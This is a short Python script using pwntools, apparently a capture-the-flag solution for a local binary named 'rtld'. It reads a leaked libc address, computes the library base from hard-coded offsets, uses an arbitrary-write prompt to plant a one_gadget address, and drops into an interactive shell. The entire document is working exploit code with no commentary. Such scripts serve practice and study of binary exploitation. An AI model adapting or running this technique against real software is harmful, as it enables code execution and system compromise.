from pwn import *

exe = ELF('rtld', checksec=False)
r = process(exe.path)
libc = ELF('libc.so.6', checksec=False)

r.recvuntil(b'stdout: ')
leak = r.recv(14).decode()
leak = int(leak, 16)
log.info('leal: ' + hex(leak))
libc.address = leak - 0x21a780
log.info("libc base: " + hex(libc.address))
input()
payload = str(libc.address + 0x5f0f48)
r.sendlineafter(b'addr: ', payload)
one_gadget = libc.address + 0xf1147
payload = str(one_gadget)
r.sendlineafter(b'value: ', payload)
r.interactive()